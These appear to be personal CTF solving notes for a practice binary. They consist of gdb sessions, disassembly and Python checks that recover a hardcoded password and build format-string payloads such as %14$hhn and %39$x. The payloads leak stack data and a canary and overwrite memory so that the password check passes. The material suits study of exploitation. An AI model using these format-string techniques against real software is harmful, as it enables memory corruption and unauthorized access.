http://stackoverflow.com/questions/6517423/do-specific-action-when-certain-breakpoint-hits-in-gdb
---
(gdb) b *0x080486a3
Breakpoint 2 at 0x80486a3
(gdb) command
Type commands for breakpoint(s) 2, one per line.
End with a line saying just "end".
>i r eax
>cont
>end 
-----
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/avi/Documents/mitctf_2017/tbd 
password> this_is_a_v
Checking this_is_a_v against the master password...

Breakpoint 2, 0x080486a3 in check_password_0 ()
eax            0x74     116

Breakpoint 2, 0x080486a3 in check_password_0 ()
eax            0x68     104

Breakpoint 2, 0x080486a3 in check_password_0 ()
eax            0x69     105

Breakpoint 2, 0x080486a3 in check_password_0 ()
eax            0x73     115

Breakpoint 2, 0x080486a3 in check_password_0 ()
eax            0x5f     95

Breakpoint 2, 0x080486a3 in check_password_0 ()
eax            0x69     105

Breakpoint 2, 0x080486a3 in check_password_0 ()
eax            0x73     115

Breakpoint 2, 0x080486a3 in check_password_0 ()
eax            0x5f     95

Breakpoint 2, 0x080486a3 in check_password_0 ()
eax            0x61     97

Breakpoint 2, 0x080486a3 in check_password_0 ()
eax            0x5f     95

Breakpoint 2, 0x080486a3 in check_password_0 ()
eax            0x76     118

Breakpoint 2, 0x080486a3 in check_password_0 ()
eax            0x65     101
FAIL!
[Inferior 1 (process 7879) exited with code 0377]
-----
(gdb) b check_password_1
Breakpoint 1 at 0x80486e1
(gdb) b *0x08048729
Breakpoint 2 at 0x8048729
-----
Breakpoint 2, 0x08048729 in check_password_1 ()
(gdb) x/i $eip
=> 0x8048729 <check_password_1+76>:     cmp    %edx,%eax
(gdb) command
Type commands for breakpoint(s) 2, one per line.
End with a line saying just "end".
>i r edx eax
>cont
>end
-----
command 1
x/4wx $ebp+8
x/s ((char**)($ebp+8))[0]
x/s ((char**)($ebp+8))[1]
x/s ((char**)($ebp+8))[3]
cont
end
-----
(gdb) b *0x080487e7
Breakpoint 3 at 0x80487e7
-----
command 3
i r ebp
x/32wx $esp
end
-----
Breakpoint 1, 0x080486e1 in check_password_1 ()
0xffffbea0:     0xffffcd63      0xffffcd9a      0x00000027      0xffffbec8
0xffffcd63:     "this_is_a_very_long_password_i_bet_you_"
0xffffcd9a:     "this_is_a_very_long_password_i_bet_you_can't_even_enter_all_of_it"
0xffffbec8:     ""
FAIL!  != c

Breakpoint 3, 0x080487e7 in check_password_1 ()
ebp            0xffffbe98       0xffffbe98
---Type <return> to continue, or q <return> to quit---
0xffffbe50:     0xffffbec8      0x00000027      0xffffcd9a      0xffffcd63
0xffffbe60:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffbe70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffbe80:     0x00000000      0x00000000      0x00000000      0x84cab300
0xffffbe90:     0x00000000      0x00000026      0xffffbef8      0x080487b7
0xffffbea0:     0xffffcd63      0xffffcd9a      0x00000027      0xffffbec8
0xffffbeb0:     0xffffbf28      0x00000026      0xffffcd9a      0xffffcd63
0xffffbec0:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb) c
Continuing.

Breakpoint 3, 0x080487e7 in check_password_1 ()
ebp            0xffffbef8       0xffffbef8
0xffffbeb0:     0xffffbf28      0x00000026      0xffffcd9a      0xffffcd63
0xffffbec0:     0x00000000      0x00000000      0x00000000      0x73696874
0xffffbed0:     0x5f73695f      0x65765f61      0x6c5f7972      0x5f676e6f
0xffffbee0:     0x73736170      0x64726f77      0x625f695f      0x795f7465
0xffffbef0:     0x005f756f      0x00000025      0xffffbf58      0x080487b7
0xffffbf00:     0xffffcd63      0xffffcd9a      0x00000026      0xffffbf28
0xffffbf10:     0xffffbf88      0x00000025      0xffffcd9a      0xffffcd63
0xffffbf20:     0x00000000      0x00000000      0x00000000      0x00000000
-----
>>> len('this_is_a_very_long_password_i_bet_you_')
39
>>> 8*4
32
>>> "this_is_a_very_long_password_i_bet_you_can't_even_enter_all_of_it"[:32]
'this_is_a_very_long_password_i_b'
-----
│           0x08048659      68208b0408     pushl $str.Checking ; str.Checking ; "Checking " @ 0x8048b20
│           0x0804865e      e81dfeffff     calll sym.imp.printf
│           0x08048663      83c410         addl $0x10, %esp
│           0x08048666      83ec0c         subl $0xc, %esp
│           0x08048669      ff7508         pushl 8(%ebp)
│           0x0804866c      e80ffeffff     calll sym.imp.printf
│           0x08048671      83c410         addl $0x10, %esp
│           0x08048674      83ec0c         subl $0xc, %esp
│           0x08048677      682c8b0408     pushl $str.against_the_master_password... ; str.against_the_master_password... ; " against the master password..." @ 0x8048b2c
│           0x0804867c      e84ffeffff     calll sym.imp.puts
-----
(gdb) r
Starting program: /home/avi/Documents/mitctf_2017/tbd 
password> %10$x

Breakpoint 1, 0x0804866c in check_password_0 ()
(gdb) x/64wx $esp
0xffffcd40:     0xffffcd8e      0x00000000      0x00000000      0x00000000
0xffffcd50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcd60:     0x00000000      0x00000000      0xffffcdf8      0x080488ba
0xffffcd70:     0xffffcd8e      0xffffcd9a      0xffffcd87      0xf7ffd930
0xffffcd80:     0xf7ff6300      0x41000000      0x00000006      0x31250001
0xffffcd90:     0x00782430      0x00000000      0x68740000      0x695f7369
0xffffcda0:     0x5f615f73      0x79726576      0x6e6f6c5f      0x61705f67
0xffffcdb0:     0x6f777373      0x695f6472      0x7465625f      0x756f795f
0xffffcdc0:     0x6e61635f      0x655f7427      0x5f6e6576      0x65746e65
0xffffcdd0:     0x6c615f72      0x666f5f6c      0x0074695f      0xaee0ac00
0xffffcde0:     0xffffd039      0x0000002f      0xffffd02b      0xf7fb3000
0xffffcdf0:     0x00000000      0x00000000      0xffffce08      0x08048a1e
0xffffce00:     0xf7fb33c4      0xffffce20      0x00000000      0xf7e23a63
0xffffce10:     0x08048aa0      0x00000000      0x00000000      0xf7e23a63
0xffffce20:     0x00000001      0xffffceb4      0xffffcebc      0xf7feb79a
0xffffce30:     0x00000001      0xffffceb4      0xffffce54      0x0804a034
(gdb) c
Continuing.
Checking ffffcdf8 against the master password...
FAIL!
[Inferior 1 (process 9847) exited with code 0377]
-----
Starting program: /home/avi/Documents/mitctf_2017/tbd 
password> %10$x AAAA

Breakpoint 1, 0x0804866c in check_password_0 ()
(gdb) x/32wx $esp
0xffffcd40:     0xffffcd8e      0x00000000      0x00000000      0x00000000
0xffffcd50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcd60:     0x00000000      0x00000000      0xffffcdf8      0x080488ba
0xffffcd70:     0xffffcd8e      0xffffcd9a      0xffffcd87      0xf7ffd930
0xffffcd80:     0xf7ff6300      0x41000000      0x0000000b      0x31250001
0xffffcd90:     0x20782430      0x41414141      0x68740000      0x695f7369
0xffffcda0:     0x5f615f73      0x79726576      0x6e6f6c5f      0x61705f67
0xffffcdb0:     0x6f777373      0x695f6472      0x7465625f      0x756f795f
-----
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/avi/Documents/mitctf_2017/tbd 
password> %21$x AAAA

Breakpoint 1, 0x0804866c in check_password_0 ()
(gdb) c
Continuing.
Checking 41414141 AAAA against the master password...
FAIL!
[Inferior 1 (process 9895) exited with code 0377]
-----
Breakpoint 1, 0x0804866c in check_password_0 ()
(gdb) i r ebp
ebp            0xffffcd68       0xffffcd68
(gdb) x/32wx $esp
0xffffcd40:     0xffffcd8e      0x00000000      0x00000000      0x00000000
0xffffcd50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcd60:     0x00000000      0x00000000      0xffffcdf8      0x080488ba
0xffffcd70:     0xffffcd8e      0xffffcd9a      0xffffcd87      0xf7ffd930
0xffffcd80:     0xf7ff6300      0x41000000      0x00000006      0x31250001
0xffffcd90:     0x00782430      0x00000000      0x68740000      0x695f7369
0xffffcda0:     0x5f615f73      0x79726576      0x6e6f6c5f      0x61705f67
0xffffcdb0:     0x6f777373      0x695f6472      0x7465625f      0x756f795f
(gdb) print $ebp+0x10
$2 = (void *) 0xffffcd78
(gdb) x/wx $ebp+0x10
0xffffcd78:     0xffffcd87
(gdb) x/wx 0xffffcd87
0xffffcd87:     0x00000641
(gdb) x/bx 0xffffcd87
0xffffcd87:     0x41
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/avi/Documents/mitctf_2017/tbd
password> %14$hhn

Breakpoint 1, 0x0804866c in check_password_0 ()
(gdb) x/32wx $esp
0xffffcd40:     0xffffcd8e      0x00000000      0x00000000      0x00000000
0xffffcd50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcd60:     0x00000000      0x00000000      0xffffcdf8      0x080488ba
0xffffcd70:     0xffffcd8e      0xffffcd9a      0xffffcd87      0xf7ffd930
0xffffcd80:     0xf7ff6300      0x41000000      0x00000008      0x31250001
0xffffcd90:     0x68682434      0x0000006e      0x68740000      0x695f7369
0xffffcda0:     0x5f615f73      0x79726576      0x6e6f6c5f      0x61705f67
0xffffcdb0:     0x6f777373      0x695f6472      0x7465625f      0x756f795f
(gdb) ni
0x08048671 in check_password_0 ()
(gdb) x/32wx $esp
0xffffcd40:     0xffffcd8e      0x00000000      0x00000000      0x00000000
0xffffcd50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcd60:     0x00000000      0x00000000      0xffffcdf8      0x080488ba
0xffffcd70:     0xffffcd8e      0xffffcd9a      0xffffcd87      0xf7ffd930
0xffffcd80:     0xf7ff6300      0x00000000      0x00000008      0x31250001
0xffffcd90:     0x68682434      0x0000006e      0x68740000      0x695f7369
0xffffcda0:     0x5f615f73      0x79726576      0x6e6f6c5f      0x61705f67
0xffffcdb0:     0x6f777373      0x695f6472      0x7465625f      0x756f795f
(gdb) c
Continuing.
Checking  against the master password...

OK, that was easy... have some pity points
cat: flag1: No such file or directory
Let's try one more.
-----
Starting program: /home/avi/Documents/mitctf_2017/tbd
password> %14$hn

Breakpoint 1, 0x0804866c in check_password_0 ()
(gdb) bt
#0  0x0804866c in check_password_0 ()
#1  0x080488ba in level_0 ()
#2  0x08048a1e in main ()
(gdb) frame 1
#1  0x080488ba in level_0 ()
(gdb) i r ebp
ebp            0xffffcdf8       0xffffcdf8
(gdb) x/wx $ebp-0x1c
0xffffcddc:     0x7da17500
(gdb) frame 0
#0  0x0804866c in check_password_0 ()
(gdb) x/64wx $esp
0xffffcd40:     0xffffcd8e      0x00000000      0x00000000      0x00000000
0xffffcd50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcd60:     0x00000000      0x00000000      0xffffcdf8      0x080488ba
0xffffcd70:     0xffffcd8e      0xffffcd9a      0xffffcd87      0xf7ffd930
0xffffcd80:     0xf7ff6300      0x41000000      0x00000007      0x31250001
0xffffcd90:     0x6e682434      0x00000000      0x68740000      0x695f7369
0xffffcda0:     0x5f615f73      0x79726576      0x6e6f6c5f      0x61705f67
0xffffcdb0:     0x6f777373      0x695f6472      0x7465625f      0x756f795f
0xffffcdc0:     0x6e61635f      0x655f7427      0x5f6e6576      0x65746e65
0xffffcdd0:     0x6c615f72      0x666f5f6c      0x0074695f      0x7da17500
0xffffcde0:     0xffffd039      0x0000002f      0xffffd02b      0xf7fb3000
0xffffcdf0:     0x00000000      0x00000000      0xffffce08      0x08048a1e
0xffffce00:     0xf7fb33c4      0xffffce20      0x00000000      0xf7e23a63
0xffffce10:     0x08048aa0      0x00000000      0x00000000      0xf7e23a63
0xffffce20:     0x00000001      0xffffceb4      0xffffcebc      0xf7feb79a
0xffffce30:     0x00000001      0xffffceb4      0xffffce54      0x0804a034
---
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/avi/Documents/mitctf_2017/tbd 
password> %14$hhn%39$x

Breakpoint 1, 0x0804866c in check_password_0 ()
(gdb) x/64wx $esp
0xffffcd40:     0xffffcd8e      0x00000000      0x00000000      0x00000000
0xffffcd50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcd60:     0x00000000      0x00000000      0xffffcdf8      0x080488ba
0xffffcd70:     0xffffcd8e      0xffffcd9a      0xffffcd87      0xf7ffd930
0xffffcd80:     0xf7ff6300      0x00000000      0x0000000d      0x31250001
0xffffcd90:     0x68682434      0x3933256e      0x68007824      0x695f7369
0xffffcda0:     0x5f615f73      0x79726576      0x6e6f6c5f      0x61705f67
0xffffcdb0:     0x6f777373      0x695f6472      0x7465625f      0x756f795f
0xffffcdc0:     0x6e61635f      0x655f7427      0x5f6e6576      0x65746e65
0xffffcdd0:     0x6c615f72      0x666f5f6c      0x0074695f      0x7786ed00
0xffffcde0:     0xffffd039      0x0000002f      0xffffd02b      0xf7fb3000
0xffffcdf0:     0x00000000      0x00000000      0xffffce08      0x08048a1e
0xffffce00:     0xf7fb33c4      0xffffce20      0x00000000      0xf7e23a63
0xffffce10:     0x08048aa0      0x00000000      0x00000000      0xf7e23a63
0xffffce20:     0x00000001      0xffffceb4      0xffffcebc      0xf7feb79a
0xffffce30:     0x00000001      0xffffceb4      0xffffce54      0x0804a034
(gdb) c
Continuing.
Checking 7786ed00 against the master password...

OK, that was easy... have some pity points
cat: flag1: No such file or directory
Let's try one more.
-----
